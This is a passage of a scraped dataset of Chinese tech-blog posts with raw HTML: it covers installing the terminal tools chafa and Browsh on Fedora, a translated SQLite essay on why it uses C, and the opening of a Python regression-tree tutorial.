class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67109405a285293147-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67109405a285293147-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67109405a285293147-1\"><span class=\"crayon-v\">chafa</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">path</span><span class=\"crayon-o\">/</span><span class=\"crayon-st\">to</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">your</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">image</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67109405a285293147-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0050 seconds] -->\r\n<p>你可以将几乎任何类型的图像投射到 <code>chafa</code>，包括 JPG、PNG、TIFF、BMP 或几乎任何 ImageMagick 支持的图像 – 这是 <code>chafa</code> 用于解析输入文件的引擎。最酷的部分是 <code>chafa</code> 还可以在你的终端内显示非常流畅的 GIF 动画！</p>\n<h4 id=\"toc_6\">安装说明</h4>\n<p><code>chafa</code> 还没有为 Fedora 打包，但从源代码构建它很容易。首先，获取必要的构建依赖项：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67109405e510919155\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo dnf install -y autoconf automake libtool gtk-doc glib2-devel ImageMagick-devel\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67109405e510919155-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67109405e510919155-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67109405e510919155-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span> <span class=\"crayon-e\">autoconf </span><span class=\"crayon-e\">automake </span><span class=\"crayon-e\">libtool </span><span class=\"crayon-v\">gtk</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">doc </span><span class=\"crayon-v\">glib2</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">devel </span><span class=\"crayon-v\">ImageMagick</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">devel</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67109405e510919155-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>接下来，克隆代码或从项目的 GitHub 页面下载快照，然后 cd 到 <code>chafa</code> 目录，这样就行了：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671094061952753985\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit clone https://github.com/hpjansson/chafa\r\n./autogen.sh\r\nmake\r\nsudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671094061952753985-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671094061952753985-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671094061952753985-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671094061952753985-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671094061952753985-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671094061952753985-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/hpjansson/chafa</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671094061952753985-2\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">autogen</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line\" id=\"crayon-5bab671094061952753985-3\"><span class=\"crayon-e\">make</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671094061952753985-4\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line\" id=\"crayon-5bab671094061952753985-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>大的图像在第一次运行时可能需要一段时间处理，但 <code>chafa</code> 会缓存你加载的所有内容。下一次运行几乎是瞬间完成的。</p>\n<h3 id=\"toc_7\">Browsh</h3>\n<p>Browsh 是完善的终端网页浏览器。它比 Lynx 更强大，当然更引人注目。 Browsh 以无头模式启动 Firefox Web 浏览器（因此你无法看到它）并在特殊 Web 扩展的帮助下将其与你的终端连接。因此，Browsh 能像 Firefox 一样呈现所有富媒体内容，只是有点像素化的风格。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/7e5270176020f2239a156e06feb31bc3.png\" alt=\"\"></p>\n<h4 id=\"toc_8\">安装说明</h4>\n<p>该项目为各种 Linux 发行版提供了包，包括 Fedora。以这种方式安装：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671094064158779160\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo dnf install -y https://github.com/browsh-org/browsh/releases/download/v1.4.6/browsh_1.4.6_linux_amd64.rpm\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671094064158779160-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671094064158779160-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671094064158779160-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/browsh-org/browsh/releases/download/v1.4.6/browsh_1.4.6_linux_amd64.rpm</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671094064158779160-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>之后，启动 <code>browsh</code> 命令并给它几秒钟加载。按 <code>Ctrl+L</code> 将焦点切换到地址栏并开始浏览 Web，就像以前一样使用！使用 <code>Ctrl+Q</code> 返回终端。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114268\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114268votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114268\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/47fa0e2c9da71e8a08f8af9c037badd5d0c473c4.jpg"}
{"title": "受 SQLite 多年青睐，C 语言到底好在哪儿？", "url": "http://blog.jobbole.com/114331/", "create_date": "2018/08/31", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/06/45d153deb05afc91d5c64e84b323bce2.png"], "url_object_id": "fe4b75893f32598469c4e529981fbd5b", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,C语言,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://sqlite.org/whyc.html\">SQLite</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/news/99485/why-is-sqlite-coded-in-c\">开源中国社区</a>   </div><p>SQLite 近日发表了一篇博文，解释了为什么多年来 SQLite 一直坚持用 C 语言来实现，以下是正文内容：</p>\n<h3><strong>C 语言是最佳选择</strong></h3>\n<p>从2000年5月29日发布至今，SQLite 一直都是用 C 语言实现。C 一直是实现像 SQLite 这类软件库的最佳语言。目前，还没有任何计划要采用另外一门语言对 SQLite 进行重新开发。</p>\n<p>为什么 C 语言是实现 SQLite 的最佳选择？原因主要体现在这几个方面：</p>\n<ul>\n<li>性能</li>\n<li>兼容性</li>\n<li>低依赖性</li>\n<li>稳定性</li>\n</ul>\n<p><strong>1、性能</strong></p>\n<p>像 SQLite 这类库要求速度必须要快。SQLite 的速度就很快，它比文件系统快 35%（详情可以参考这两个示例：<a href=\"https://sqlite.org/intern-v-extern-blob.html\">Internal Versus External BLOBs</a> 和 <a href=\"https://sqlite.org/fasterthanfs.html\">35% Faster Than The Filesystem</a>）。</p>\n<p>而 C 语言就能实现快速编写代码。C 语言通常被描述为“可移植性的汇编语言”。它使开发人员能够尽可能靠近底层硬件进行编码，同时仍然可以跨平台保持可移植性。</p>\n<p>平常，我们可能会看到有人描述某种语言“像 C 语言一样快”，却不会看到有人说，作为通用目的编程时，会有一门语言“比 C 语言快”，因为这种语言真的不存在。</p>\n<p><strong>2、兼容性</strong></p>\n<p>几乎所有系统都能调用 C 语言编写的库，但其他语言就不尽然。例如，用 Java 编写的 Android 应用能够调用 SQLite（通过适配器）。 如果用 Java 编写 SQLite，那么对 Android 来说可能会更方便，因为这会使接口更简单。但在 iPhone 上，应用程序是用 Objective-C 或 Swift 编写的，它们都不能调用用 Java 编写的库。 因此，如果用 Java 编写，SQLite 将无法在 iPhone 上使用。</p>\n<p><strong>3、低依赖性</strong></p>\n<p>用 C 语言编写的库对运行时没有很强的依赖。SQLite 的最低配置也只要求 C 库中的这些方法：</p>\n<ul>\n<li>memcmp()</li>\n<li>memcpy()</li>\n<li>memmove()</li>\n<li>memset()</li>\n<li>strcmp()</li>\n<li>strlen()</li>\n<li>strncmp()</li>\n</ul>\n<p>在更完整的构建中，SQLite 也使用诸如 malloc() 和 free() 之类的库例程以及用于打开，读取，写入和关闭文件的操作系统接口。 但即便如此，依赖的数量也很少。</p>\n<p><strong>4、稳定性</strong></p>\n<p>C 语言易于理解，契合了 SQLite 的要求，适合 SQLite 的开发。</p>\n<h3><strong>为什么 SQLite 不使用面向对象的语言？</strong></h3>\n<p>开发人员可能无法想象用“非面向对象”来开发一个像 SQLite 这样复杂的系统会是什么样子。所以 SQLite 为什么不使用 C++ 或者 Java 来开发呢？</p>\n<p>1、用 C++ 或 Java 编写的库通常只能由以相同语言编写的应用程序使用。 使用 Haskell 或 Java 编写的应用程序很难调用用 C++ 编写的库。 另一方面，用 C 语言编写的库可以从任何编程语言调用。</p>\n<p>2、面向对象是设计模式，而不是编程语言。 你可以使用任何所需语言（包括汇编语言）进行面向对象编程。 某些语言（例如：C++ 或 Java）可以使面向对象更容易，但你仍然可以用像 C 这样的语言进行面向对象的编程。</p>\n<p>3、面向对象不是唯一有效的设计模式。对象通常是分解问题的好方法。 但不是唯一的方法，也不总是分解问题的最佳方法。 有时好的旧程序代码更容易编写，更易于维护和理解，并且比面向对象的代码更快。</p>\n<p>4、SQLite 进行开发时，Java 还不是一门成熟的语言，C++ 会成熟一点，但当时要找到两种能以 相同方式工作的 C++ 编译器比较困难。相比之下，C 语言是个不错的选择。虽然，这种情况现在有所改善，但为此对 SQLite 重新开发并没有什么好处。</p>\n<h3><strong>为什么 SQLite 不使用”安全”语言编写？</strong></h3>\n<p>使用“安全”语言不易发生内存泄露、数组溢出等的安全问题。最近，许多人好像对 Rust 和 Go 这样的“安全”语言感兴趣。但 SQLite 为什么不使用呢？</p>\n<p>1、SQLite 出现后的 10 年时间里，所谓的“安全”语言还不存在。虽然 SQLite 可以用 Rust 或者 Go 重新编写，但这样可能会引入更多难以修复的 Bug，进而会影响编码速度。</p>\n<p>2、“安全”编程语言解决简单的问题：像内存泄露、数组溢出等。在解决 SQL 计算结果这类的问题上，并不如 C 语言好用。</p>\n<p>3、“安全”语言可防止安全漏洞，但 SQLite 并非一个对安全敏感的库。如果应用运行了不受信任的 SQL，那它可能已经存在更大的安全问题，而这是“安全”语言无法修复的问题。</p>\n<p>4、一些“安全”语言（如 Go 语言）不喜欢使用 assert()，但这是保持 SQLite 可维护性的重要前提。</p>\n<p>5、“安全”语言会插入额外的机器分支来执行其他操作。但在正确的代码中，这些分支并不会被采用。所以机器代码不能 100% 被测试到，可这恰恰是 SQLite 质量检测的重要组成部分。</p>\n<p>6、“安全”语言会在内存不足（OOM）时请求终止，而 SQLite 的设计是遇到 OOM 时能重新恢复。目前，还不知道如何利用“安全”语言实现这一点。</p>\n<p>7、现有的“安全”语言都比较新，SQLite 开发员对它们的出现表示赞赏，但依然认为 C 语言更适合目前的开发工作。</p>\n<p>文章最后表示，SQLite 可能会考虑使用 Rust 重新开发，但不太可能使用 Go 语言，因为它对 assert() 不友好。但其实 Rust 目前的条件并不足以对 SQLite 进行重新开发，它还需要继续发展，详情请<a href=\"http://www.techug.com/post/sqlite-why-c-lang.html\">查看原文</a>。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114331\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114331votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114331\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/aafb49412a97044486e9b4c16ac603ece4966968.jpg"}
{"title": "回归树的原理及其 Python 实现", "url": "http://blog.jobbole.com/114261/", "create_date": "2018/08/10", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/04/ff247977ac3e5237654ad324e8c880ed.jpg"], "url_object_id": "6ddf04d4e1a447d7050eca53d31a7443", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,回归树,机器学习,算法", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/jobbole\">伯乐在线读者</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>提到回归树，相信大家应该都不会觉得陌生（不陌生你点进来干嘛[捂脸]），大名鼎鼎的 GBDT 算法就是用回归树组合而成的。本文就回归树的基本原理进行讲解，并手把手、肩并肩地带您实现这一算法。</p>\n<p>完整实现代码请参考 github： <a href=\"https://link.zhihu.com/?target=https%3A//github.com/tushushu/Imylu/blob/master/regression_tree.py\" target=\"_blank\" rel=\"nofollow noreferrer\">https://github.com/tushushu/Imylu/blob/master/regression_tree.py</a></p>\n<h2>1. 原理篇</h2>\n<p>我们用人话而不是大段的数学公式，来讲讲回归树是怎么一回事。</p>\n<h2>1.1 最简单的模型</h2>\n<p>如果预测某个连续变量的大小，最简单的模型之一就是用平均值。比如同事的平均年龄是 28 岁，那么新来了一批同事，在不知道这些同事的任何信息的情况下，直觉上用平均值 28 来预测是比较准确的，至少比 0 岁或者 100 岁要靠谱一些。我们不妨证明一下我们的直觉：</p>\n<ol>\n<li>定义损失函数 L，其中 y_hat 是对 y 预测值，使用 MSE 来评估损失：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+L+%3D+-%5CLarge%5Cfrac%7B1%7D%7B2%7D%5Cnormalsize%5Csum_%7Bi%3D0%7D%5Em%28y_i-%5Chat%7By%7D%29+%5E+2\" alt=\" L = -Largefrac{1}{2}normalsizesum_{i=0}^m(y_i-hat{y}) ^ 2\"></li>\n<li>对 y_hat 求导:<br>\n<img src=\"https://www.zhihu.com/equation?tex=+%5Clarge+%5Cfrac%7B%5Cmathrm%7Bd%7DL%7D%7B%5Cmathrm%7Bd%7D%5Chat%7By%7D%7D+%5Cnormalsize+%3D+%5Csum_%7Bi%3D0%7D%5Em%28y_i-%5Chat%7By%7D%29+%3D+%5Csum_%7Bi%3D0%7D%5Emy_i+-+%5Csum_%7Bi%3D0%7D%5Em%5Chat%7By%7D+%3D+%5Csum_%7Bi%3D0%7D%5Emy_i+-+m%2A%5Chat%7By%7D+\" alt=\" large frac{mathrm{d}L}{mathrm{d}hat{y}} normalsize = sum_{i=0}^m(y_i-hat{y}) = sum_{i=0}^my_i - sum_{i=0}^mhat{y} = sum_{i=0}^my_i - m*hat{y} \"></li>\n<li>令导数等于 0，最小化 MSE，则:<br>\n<img src=\"https://www.zhihu.com/equation?tex=+%5Csum_%7Bi%3D0%7D%5Emy_i+-+m%2A%5Chat%7By%7D+%3D+0\" alt=\" sum_{i=0}^my_i - m*hat{y} = 0\"></li>\n<li>所以，<br>\n<img src=\"https://www.zhihu.com/equation?tex=+%5Chat%7By%7D+%3D+%5CLarge%5Cfrac%7B1%7D%7Bm%7D%5Cnormalsize%5Csum_%7Bi%3D0%7D%5Emy_i+\" alt=\" hat{y} = Largefrac{1}{m}normalsizesum_{i=0}^my_i \"></li>\n<li>结论，如果要用一个常量来预测 y，用 y 的均值是一个最佳的选择。</li>\n</ol>\n<h2>1.2 加一点难度</h2>\n<p>仍然是预测同事年龄，这次我们预先知道了同事的职级，假设职级的范围是整数1-10，如何能让这个信息帮助我们更加准确的预测年龄呢？</p>\n<p>一个思路是根据职级把同事分为两组，这两组分别应用我们之前提到的“平均值”模型。比如职级小于 5 的同事分到A组，大于或等于5的分到 B 组，A 组的平均年龄是 25 岁，B 组的平均年龄是 35 岁。如果新来了一个同事，职级是 3，应该被分到 A 组，我们就预测他的年龄是 25 岁。</p>\n<h2>1.3 最佳分割点</h2>\n<p>还有一个问题待解决，如何取一个最佳的分割点对不同职级的同事进行分组呢？</p>\n<p>我们尝试所有 m 个可能的分割点 P_i，沿用之前的损失函数，对 A、B 两组分别计算 Loss 并相加得到 L_i。最小的 L_i 所对应的 P_i 就是我们要找的“最佳分割点”。</p>\n<h2>1.4 运用多个变量</h2>\n<p>再复杂一些，如果我们不仅仅知道了同事的职级，还知道了同事的工资（貌似不科学），该如何预测同事的年龄呢？</p>\n<p>我们可以分别根据职级、工资计算出职级和工资的最佳分割点P_1, P_2，对应的Loss L_1, L_2。然后比较L_1和L2，取较小者。假设L_1 &lt; L_2，那么按照P_1把不同职级的同事分为A、B两组。在A、B组内分别计算工资所对应的分割点，再分为C、D两组。这样我们就得到了AC, AD, BC, BD四组同事以及对应的平均年龄用于预测。</p>\n<h2>1.5 答案揭晓</h2>\n<p>如何实现这种1 to 2, 2 to 4, 4 to 8的算法呢？</p>\n<p>熟悉数据结构的同学自然会想到二叉树，这种树被称为回归树，顾名思义利用树形结构求解回归问题。</p>\n<h2>2. 实现篇</h2>\n<p>本人用全宇宙最简单的编程语言——Python实现了回归树算法，没有依赖任何第三方库，便于学习和使用。简单说明一下实现过程，更详细的注释请参考本人github上的代码。</p>\n<h2>2.1 创建Node类</h2>\n<p>初始化，存储预测值、左右结点、特征和分割点</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2d97694924313\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass Node(object):\r\n    def __init__(self, score=None):\r\n        self.score = score\r\n        self.left = None\r\n        self.right = None\r\n        self.feature = None\r\n        self.split = 